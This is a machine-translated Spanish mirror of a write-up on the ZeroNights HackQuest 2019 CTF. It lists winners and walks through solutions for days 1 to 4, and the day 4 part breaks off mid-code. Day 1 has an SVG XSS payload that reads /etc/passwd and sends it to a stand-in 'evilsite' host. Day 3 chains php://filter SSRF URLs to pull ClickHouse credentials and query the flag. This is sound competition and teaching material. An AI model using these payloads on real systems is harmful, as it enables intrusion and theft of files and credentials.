<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üåó ‚öΩÔ∏è ü¶Ö ZeroNights Hackquest 2019. Resultados y rese√±as üõ©Ô∏è üîè üôçüèΩ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="M√°s recientemente, la HackQuest anual, programada para coincidir con la conferencia ZeroNights, ha finalizado. Como en a√±os anteriores, los participan...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ZeroNights Hackquest 2019. Resultados y rese√±as</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472416/"><p> M√°s recientemente, la HackQuest anual, programada para coincidir con la conferencia ZeroNights, ha finalizado.  Como en a√±os anteriores, los participantes tuvieron que resolver 7 tareas diferentes, una para el d√≠a de la b√∫squeda.  Las tareas, como siempre, ayudaron a preparar a nuestros socios de la comunidad.  Puede descubrir c√≥mo se resolvieron las tareas y qui√©n se convirti√≥ en los ganadores de la hackquest esta vez, bajo el corte. </p><br><img src="https://habrastorage.org/webt/fg/tn/kk/fgtnkkl6yedcvzkmsnb_koppplo.jpeg" alt="imagen"><br><a name="habracut"></a><br><h2>  D√≠a 1. TOP SECRET </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Ganadores </td></tr><tr><td align="center">  <b>1er lugar</b> </td><td align="center">  <b>2do lugar</b> </td></tr><tr><td align="center">  vladvis </td><td align="center">  Gotdaswag </td></tr></tbody></table></div><br><p>  La primera tarea de este a√±o fue preparada por el equipo de auditor√≠a de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Seguridad Digital</a> .  Para resolverlo, los participantes tuvieron que pasar por tres etapas: acceder a los contenidos del chat interno del portal del juego, explotar la vulnerabilidad en el bot de Discord y usar la configuraci√≥n de derechos incorrecta en el cl√∫ster de Kubernetes. </p><br><div class="spoiler">  <b class="spoiler_title">La decisi√≥n de la tarea del primer d√≠a (vladvis)</b> <div class="spoiler_text"><h2>  1er paso: graphql </h2><br><ul><li>  Inicialmente, llegamos a una aplicaci√≥n web con un juego y calificaci√≥n del lado del cliente js. <br><img src="https://habrastorage.org/getpro/habr/post_images/9cf/5f7/9b1/9cf5f79b1b46572ab7a9672cd2aab2b1.png"></li><li>  Adem√°s de est√°tica, solo se realiza 1 solicitud al backend: <br><img src="https://habrastorage.org/getpro/habr/post_images/751/d40/d27/751d40d27d15215ce845b84c9a9a9c06.png"></li><li>  Puede obtener una lista de todos los tipos y sus campos con la siguiente consulta: <br><pre><code class="plaintext hljs">{ __schema { types { name fields { name } } } }</code> </pre> </li><li>  Vemos el campo de comentarios, lo solicitamos en la solicitud inicial y obtenemos un enlace al siguiente paso. </li></ul><br><h2>  2do paso: discord bot </h2><br><ul><li>  Un bot nos encuentra en el servidor y crea un canal separado para nosotros. <br><img src="https://habrastorage.org/getpro/habr/post_images/956/219/d71/956219d717f189f25cc3a61c749a8c18.png"></li><li>  Inmediatamente vemos una pista de SSRF en gitea, pero nunca llegu√© a eso = ( </li><li>  Intentamos leer el archivo local: <br><pre> <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> </pre> </li><li>  Obtenemos / etc / passwd y vemos 2 usuarios: trabajador, en cuyo nombre se representan svg y gitea <br><pre> <code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh gitea:x:1001:1001::/home/gitea:/bin/sh</code> </pre> </li><li>  En este paso, pas√© por una ruta no deseada: en .bash_history, el trabajador ten√≠a rutas a la clave ssh y la direcci√≥n del servidor para la siguiente etapa <br><pre> <code class="plaintext hljs">cd nano .ssh/connect_info echo &gt; .bash_history exit cd cd .ssh/ chmod 755 id_rsa ls -al cat id_rsa exit</code> </pre> <br><h2>  3er paso: kubernetes </h2></li><li>  Parece que llegu√© a esta etapa primero.  .bash_history y ps estaban vac√≠os y de esto conclu√≠ que para cada ip se crea un entorno aislado <br><img src="https://habrastorage.org/getpro/habr/post_images/225/584/a43/225584a43fca0887057424b64a1ee1b4.jpg"></li><li>  Se encontr√≥ una ficha para kubernetes en el monte <br><img src="https://habrastorage.org/getpro/habr/post_images/4d5/d0b/87e/4d5d0b87ed9b52c107a3d536cfb07f08.png"></li><li>  Al principio no estaba claro d√≥nde obtener el token, y comenc√© a escanear la cuadr√≠cula ... y en alg√∫n momento comenc√© a caminar hacia los vecinos en la nube </li><li>  Despu√©s de eso, se emiti√≥ una sugerencia sobre qu√© subredes para escanear, y se encontraron restos de api kubernetes casi de inmediato </li><li>  En este punto, me di cuenta de que no estaba solo en el servidor y que no deseaba cortar algo, por ejemplo, enmascarar cmdline, as√≠ que decid√≠ hacerlo. <del>  mas facil </del>  es m√°s doloroso y avanza hacia s√≠ mismo calce proxy a trav√©s de ssh </li><li>  Usando <code>kubectl get pods</code> , se obtuvo una lista de contenedores, y la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">documentaci√≥n de kubernetes</a> sugiri√≥ que exec podr√≠a usarse con la misma sintaxis que docker </li><li>  Luego hubo 1.5 horas de sufrimiento con el proxy de calcetines, a trav√©s del cual no surgi√≥ websocket para ejecutivos.  Termin√© yendo directamente a kubectl a trav√©s de ssh <br><img src="https://habrastorage.org/getpro/habr/post_images/f49/096/be8/f49096be8b3c769802f612325f70e7ba.png"></li><li>  El segundo contenedor tiene un nuevo token y ya ten√≠a acceso al cl√∫ster en el espacio de nombres vecino zn2 (inicialmente estamos en el espacio de nombres zn1), desde el cual era visible redis </li><li>  Recordamos el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">informe</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">@paulaxe</a> del pasado Zeronights y obtenemos RCE, por ejemplo, usando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">este PoC</a> </li><li>  Despu√©s de recibir el siguiente token, puedes sacar la bandera de los secretos de kubernetes <br><img src="https://habrastorage.org/getpro/habr/post_images/71e/49d/172/71e49d172f647b8311233e5646dd9170.png"></li></ul></div></div><br><h2>  D√≠a 2. MICOSOFT LUNIX </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Ganadores </td></tr><tr><td align="center">  <b>1er lugar</b> </td><td align="center">  <b>2do lugar</b> </td><td align="center">  <b>3er lugar</b> </td></tr><tr><td align="center">  desgarrado </td><td align="center">  Pecado__ </td><td align="center">  AV1ct0r </td></tr><tr><td colspan="3" align="center">  Tambi√©n decidi√≥: demidov_al, gotdaswag, medidrdrider, groke_is_love_groke_is_life </td></tr></tbody></table></div><br><p>  La asignaci√≥n del segundo d√≠a fue preparada por miembros de la comunidad <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">r0 Crew</a> .  Para resolver esto, debe generar una clave de activaci√≥n para una imagen de Linux con un n√∫cleo modificado. </p><br><div class="spoiler">  <b class="spoiler_title">La decisi√≥n de la tarea del segundo d√≠a (desgarrada)</b> <div class="spoiler_text"><p>  Dado: archivo <code>jD74nd8_task2.iso</code> , imagen ISO de arranque.  De los archivos dentro de la imagen, podemos suponer que se trata de Linux: hay un <code>boot/kernel.xz</code> kernel <code>boot/kernel.xz</code> , un <code>boot/rootfs.xz</code> y un cargador de arranque <code>boot/syslinux/</code> . </p><br><p>  Estamos tratando de descomprimir el n√∫cleo y el disco ram.  Ramdisk aqu√≠ es un archivo cpio normal comprimido por xz.  Desempaquete el kernel usando el script <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a> .  Tambi√©n puede prestar atenci√≥n a la informaci√≥n del n√∫cleo: </p><br><pre> <code class="plaintext hljs">&gt; file kernel.xz kernel.xz: Linux kernel x86 boot executable bzImage, version 5.0.11 (billy@micosoft.com) #1 SMP Sat Aug 25 13:37:00 CEST 2019, RO-rootFS, swap_dev 0x2, Normal VGA</code> </pre> <br><p>  En el camino, encontramos en la imagen iso la tarea principal de <code>minimal/rootfs/bin/activator</code> : todo se reduce a escribir los datos de correo electr√≥nico ingresados ‚Äã‚Äãy la clave de activaci√≥n en el dispositivo <code>/dev/activate</code> en el formato <code>$email|$key</code> .  En caso de una verificaci√≥n exitosa de la clave, leer desde <code>/dev/activate</code> producir√° la l√≠nea <code>ACTIVATED</code> , y el activador en este caso comenzar√° el juego 2048. </p><br><p>  Es hora de mirar la tarea en din√°mica.  Para hacer esto, ejecute el emulador en KVM: </p><br><pre> <code class="plaintext hljs">&gt; qemu-system-x86_64 -enable-kvm -drive format=raw,media=cdrom,readonly,file=jD74nd8_task2.iso</code> </pre> <br><p>  Linux se inicia e inicia inmediatamente <code>/bin/activator</code> desde la superposici√≥n.  Esto se explica en <code>/etc/inittab</code> .  Para evitar profundizar en el binario durante mucho tiempo, quer√≠a obtener un shell y mirar al menos <code>/proc</code> y <code>/sys</code> .  La forma m√°s f√°cil para m√≠ fue simplemente cargar el archivo iso en el lugar donde se encuentra el script del activador.  En lugar de <code>sleep 1</code> set <code>/bin/sh</code> , es decir  Recib√≠ un shell despu√©s de cada intento de ingresar una serie. </p><br><p>  Entonces, hay un shell: vemos que <code>/proc/kallsyms</code> ausente, es decir  faltan caracteres del n√∫cleo.  Con ellos, por supuesto, ser√≠a mucho m√°s r√°pido, pero est√° bien.  Estamos buscando informaci√≥n sobre el dispositivo <code>/dev/activator</code> : </p><br><pre> <code class="plaintext hljs">/ # ls -la /dev/activate crw------- 1 0 0 252, 0 Oct 15 08:57 /dev/activate / # cat /proc/devices Character devices: ... 252 activate ... Block devices: ...</code> </pre> <br><p>  De la informaci√≥n en <code>/proc/devices</code> se puede ver que este es un dispositivo char con versi√≥n principal 252 y menor 0. </p><br><p>  Es hora de encontrar la funci√≥n de registro de este dispositivo en el binario del kernel para encontrar el controlador para su operaci√≥n de <code>write</code> .  Para hacer esto, encuentre referencias cruzadas a la cadena <code>activate</code> .  Pero no existe esa l√≠nea en el n√∫cleo, probablemente de alguna manera est√° oculta. </p><br><p>  En el pr√≥ximo intento, tratamos de encontrar las funciones responsables de registrar dispositivos de caracteres: <code>cdev_add</code> y <code>register_chrdev</code> .  Esto se puede hacer mediante referencias cruzadas <code>/dev/console</code> o cualquier otro dispositivo de caracteres y tomando el c√≥digo fuente del n√∫cleo (tom√© la versi√≥n 5.0.11, pero no estoy seguro de si la versi√≥n es correcta).  Despu√©s de mirar la lista de dispositivos que se est√°n registrando, no encontramos un dispositivo con la versi√≥n principal 252. Es probable que estas dos funciones no se registren. </p><br><p>  Intentemos buscar otras pistas en la din√°mica: </p><br><pre> <code class="plaintext hljs">/ # ls -la /sys/dev/char/252:0 lrwxrwxrwx 1 0 0 0 Oct 15 09:00 /sys/dev/char/252:0 -&gt; ../../devices/virtual/EEy????I/activate</code> </pre> <br><p>  Aqu√≠ est√° el <code>EEy????I</code> : ¬øla <code>EEy????I</code> dispositivo <code>EEy????I</code>  ¬°Intentamos encontrar esta l√≠nea en el binario y est√° ah√≠! </p><br><p><img src="https://habrastorage.org/webt/ww/2x/pa/ww2xpaeiblwxlyive4ytkkdp4iq.png"></p><br><p>  Aunque no se encontraron referencias cruzadas a √©l, pero al lado hay datos visibles similares a las cadenas.  Si observa el c√≥digo que los usa, puede ver que estos son los controladores de lectura y escritura deseados del dispositivo de <code>activate</code> que est√°n cifrados con XOR simple. </p><br><p>  Funci√≥n de procesamiento de lectura: </p><br><p><img src="https://habrastorage.org/webt/wr/gj/le/wrgjlelw6zor474zwwy2eins8zw.png"></p><br><p>  La funci√≥n de procesar la operaci√≥n de escritura, tambi√©n es una verificaci√≥n de licencia: </p><br><p><img src="https://habrastorage.org/webt/go/sh/vm/goshvmqukonyiv69nltp_g9xrlw.png"></p><br><p>  Una inspecci√≥n r√°pida del c√≥digo de verificaci√≥n de activaci√≥n mostr√≥ que es m√°s f√°cil colocar un punto de interrupci√≥n en la direcci√≥n <code>0xFFFFFFFF811F094B</code> y recoger el c√≥digo de activaci√≥n all√≠, sin profundizar realmente en lo que est√° sucediendo all√≠.  Para hacer esto, ejecuta qemu con la bandera <code>-s</code> .  En este caso, qemu ejecuta gdb stub, que le permite usar cualquier cliente gdb.  La forma m√°s f√°cil y r√°pida de hacer esto en IDA Pro, si tiene una licencia.  Pero nadie proh√≠be hacer todo en la consola gdb. </p><br><p>  Hacemos todo como se describe en el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">tutorial</a> oficial.  Ahora necesita encontrar la funci√≥n de procesamiento dentro del n√∫cleo ya en ejecuci√≥n. </p><br><p><img src="https://habrastorage.org/webt/ql/cc/f1/qlccf1qgfqvp3mimbbuyazih4de.png"></p><br><p><img src="https://habrastorage.org/webt/jh/ui/br/jhuibrua89zngguxpedg0oco8h8.png"></p><br><p>  Dado que el n√∫cleo est√° construido con soporte KASLR, las direcciones del n√∫cleo en ejecuci√≥n se desplazan a un desplazamiento aleatorio que se genera cada vez que se inicia el n√∫cleo.  Calculamos este desplazamiento (tomamos la direcci√≥n de la secuencia de bytes √∫nica en el c√≥digo del n√∫cleo depurado y restamos la direcci√≥n de esta secuencia del binario) y, agregando la funci√≥n de activaci√≥n a la direcci√≥n, la encontramos en la memoria.  Todo, ahora depende de lo peque√±o.  Establecer un punto de interrupci√≥n y recoger el c√≥digo. </p><br><p><img src="https://habrastorage.org/webt/ef/yp/vg/efypvgwh0kyc2zi999ucriitvt8.png"></p><br><p><img src="https://habrastorage.org/webt/nt/ny/wa/ntnywaix5hh2hptggey0gk9a8fi.png"></p><br><p><img src="https://habrastorage.org/webt/q4/4c/tm/q44ctmpm3uzgmm_9tigzw9us4a0.png"></p></div></div><br><p>  La soluci√≥n a esta tarea ya ha sido publicada en el centro por uno de los participantes.  Puedes conocerlo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . </p><br><h2>  D√≠a 3. CASA DE BECHED </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  Ganadores </td></tr><tr><td align="center">  <b>1er lugar</b> </td></tr><tr><td align="center">  blackfan </td></tr></tbody></table></div><br><p>  Trabajo preparado por beched ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">DeteAct</a> ).  Los participantes fueron recibidos por una p√°gina de pago sin complicaciones.  Para la soluci√≥n, fue necesario acceder a la base de datos Clickhouse utilizando la funci√≥n de la funci√≥n php <code>file_get_contents</code> . </p><br><div class="spoiler">  <b class="spoiler_title">La decisi√≥n de la tarea del tercer d√≠a (blackfan)</b> <div class="spoiler_text"><p>  La tarea es una p√°gina de pago, donde el √∫nico par√°metro interesante era callback_url. </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/c6c/428/f02/c6c428f02a3ea33075cbe0d5d556ace8.png" alt="https://i.imgur.com/iX65TI3.png"></p><br><p>  Indicamos su sitio y captamos la solicitud: </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=http://attacker.tld/&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="plaintext hljs">POST / HTTP/1.0 Host: attacker.tld Connection: close Content-Length: 21 Content-Type: application/json amount=0&amp;payment_id=0</code> </pre> <br><p>  Una respuesta HTTP se muestra solo si el sitio devuelve una cadena alfanum√©rica.  Ejemplos de respuestas: </p><br><pre> <code class="plaintext hljs">{"result":"Success.","msg":"Response: testresponse"} {"result":"Invalid status code.","msg":"Non-alphanumeric response."}</code> </pre> <br><p>  Intentamos como datos callback_url :, probar y comprender que, muy probablemente, esto es PHP. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=data:,test&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  Usamos php: // filter para leer archivos locales y codificar la respuesta usando convert.base64-encode para que la respuesta coincida con alfanum√©ricos.  Debido a los caracteres +, / y =, a veces es necesario combinar varias llamadas de base64 para mostrar una respuesta. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./index.php http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./includes/db.php</code> </pre> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> error_reporting(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* * DB configuration */</span></span> $config = [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'port'</span></span></code> </pre> <br><p>  La salida de respuesta est√° limitada a 200 bytes, pero de los fragmentos aprendemos sobre la disponibilidad de la base de datos en localhost.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Ordenamos</a> los puertos a trav√©s de callback_url y encontramos un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">nuevo art√≠culo sobre inyecci√≥n en ClickHouse en el blog DeteAct</a> , que corresponde al extra√±o nombre de la tarea "HOUSE OF BECHED". </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/5fb/f00/b42/5fbf00b42a4499e928edfd469a81e755.png" alt="https://i.imgur.com/OBn22wi.png"></p><br><p>  ClickHouse tiene una interfaz HTTP que le permite realizar solicitudes arbitrarias, lo cual es muy conveniente de usar en SSRF. </p><br><p>  Leemos la documentaci√≥n, intentamos obtener una cuenta de la configuraci√≥n. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">yandex</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Profiles of settings. --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">profiles</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Default settibm</span></span></code> </pre> <br><p>  Nuevamente, la limitaci√≥n de la salida interfiere y, a juzgar por el archivo est√°ndar, el campo deseado est√° extremadamente lejos. </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/6e8/6f9/35f/6e86f935fc695b845a63aebbbcd76626.png" alt="https://i.imgur.com/5Un6gfj.png"></p><br><p>  Corta el exceso usando el filtro string.strip_tags. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  Pero la longitud de salida a√∫n no es suficiente hasta que se recibe la contrase√±a.  Agregue un filtro de compresi√≥n zlib.deflate. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|zlib.deflate|convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  Y lea localmente en orden inverso: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span>(file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://filter/convert.base64-decode|convert.base64-decode|zlib.inflate/resource=data:,NCtYaTVWSUFBbVFTRnd1VFoyZ0FCN3hjK0JRU2tDNUt6RXZKejBXMms3QkxETkVsZUNueVNsSnFja1pxU2taK2FYRnFYbjVHYW1JQmZoZWo4a0RBeWtyZkFGME5QajBwcVdtSnBUa2xWRkNFNlJaTUVWSkZRU0JSd1JZNWxGRTFVY3NLYllVa0JiV2NFbXNGUTRYOElv'</span></span>));</code> </pre> <br><p>  Despu√©s de recibir la contrase√±a, podemos enviar solicitudes de ClickHouse de la siguiente manera: </p><br><pre> <code class="plaintext hljs">http://localhost:8123/?query=select%20'xxx'&amp;user=default&amp;password=bechedhousenoheap http://default:bechedhousenoheap@localhost:8123/?query=select%20'xxx'</code> </pre> <br><p>  Pero dado que inicialmente enviamos POST, necesitamos evitar esto usando la redirecci√≥n.  Y la solicitud final result√≥ as√≠ (en esta etapa era muy tonto, porque debido a la gran anidaci√≥n del procesamiento de los par√°metros, codifiqu√© incorrectamente caracteres especiales y no pude ejecutar la solicitud) </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520'xxx'%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  Bueno, entonces solo obtenga los datos de la base de datos: </p><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.tables <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.columns <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span>=<span class="hljs-string"><span class="hljs-string">'flag4zn'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> bechedflag <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> flag4zn</code> </pre> <br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520bechedflag%252520from%252520flag4zn%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> </div></div><br><h2>  D√≠a 4. ASR-EHD </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  Ganadores </td></tr><tr><td align="center">  <b>1er lugar</b> </td></tr><tr><td align="center">  AV1ct0r </td></tr></tbody></table></div><br><p>  La asignaci√≥n del cuarto d√≠a fue preparada por el Departamento de Investigaci√≥n de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Seguridad Digital</a> .  La tarea principal de la tarea era mostrar c√≥mo la elecci√≥n incorrecta de la fuente de n√∫meros aleatorios puede afectar el algoritmo criptogr√°fico.  En taskka, se implement√≥ un generador de clave privada aleatorio autoescrito para DH, basado en LFSR.  Al recibir un n√∫mero suficiente de apretones de manos TLS consecutivos utilizando valores de DH p√∫blicos, fue posible restaurar el estado inicial del LFSR y descifrar todo el tr√°fico. </p><br><div class="spoiler">  <b class="spoiler_title">La decisi√≥n de la tarea del cuarto d√≠a (AV1ct0r)</b> <div class="spoiler_text"><h1 id="day-4--asr-ehd--writeup-by-av1ct0r">  D√≠a 4 / ASR-EHD - WriteUp por AV1ct0r </h1><br><p>  Peter es un poco paranoico: siempre usa conexiones cifradas.  Para asegurarse de que los algoritmos son seguros, Peter usa su propio cliente.  Incluso nos dio un volcado de tr√°fico que se hizo mientras usaba su cliente personalizado.  ¬øEs realmente segura la conexi√≥n de Peter? </p><br><p>  <a href="">https://hackquest.zeronights.org/downloads/task4/8Jdl3f_client.tar</a> <br>  <a href="">https://hackquest.zeronights.org/downloads/task4/d8f3ND_dump.tar</a> </p><br><ol><li><p>  Abra el archivo del cliente en IDA Pro y vea que puede descargar parte del archivo flag.jpg del servidor <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://ssltest.a1exdandy.me:443/</a> .  Qu√© parte del archivo descargar (de qu√© byte) se toma de la l√≠nea de comando. </p><br><pre> <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init 